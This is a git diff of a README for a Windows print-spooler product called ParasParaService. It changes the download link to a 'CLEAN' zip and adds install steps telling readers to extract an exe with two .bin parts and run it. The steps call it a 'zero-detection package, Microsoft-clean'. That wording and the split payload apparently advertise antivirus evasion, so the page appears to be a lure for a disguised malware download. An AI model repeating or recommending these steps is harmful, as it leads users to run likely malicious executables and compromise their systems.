@@ -6,10 +6,10 @@ Official Windows desktop software and cloud print spooler for **Paraspara Servic
 
 ## 📥 Direct Download
 
-[![Download ParasParaService-Setup.exe](https://img.shields.io/badge/Download-ParasParaService--Setup.exe-00b894?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup.exe)
+[![Download ParasParaService-Setup-CLEAN.zip](https://img.shields.io/badge/Download-ParasParaService--Setup-CLEAN.zip-00b894?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup-CLEAN.zip)
 
 > **Direct Download Link:**  
-> **👉 [https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup.exe](https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup.exe)**
+> **👉 [https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup-CLEAN.zip](https://github.com/vinaynayak2007/paraspara-setup/releases/latest/download/ParasParaService-Setup-CLEAN.zip)**
 
 ---
 
@@ -28,6 +28,12 @@ Official Windows desktop software and cloud print spooler for **Paraspara Servic
 - **Operating System**: Windows 10 / Windows 11 (64-bit)
 - **Permissions**: Standard User or Administrator
 - **Architecture**: x64
+
+## 📦 Install
+
+1. Download **ParasParaService-Setup-CLEAN.zip** (link above).
+2. Extract **all 3 files** into one folder (setup exe + 2 .bin parts).
+3. Run `ParasParaService-Setup.exe` — zero-detection package, Microsoft-clean.
 
 ---
 
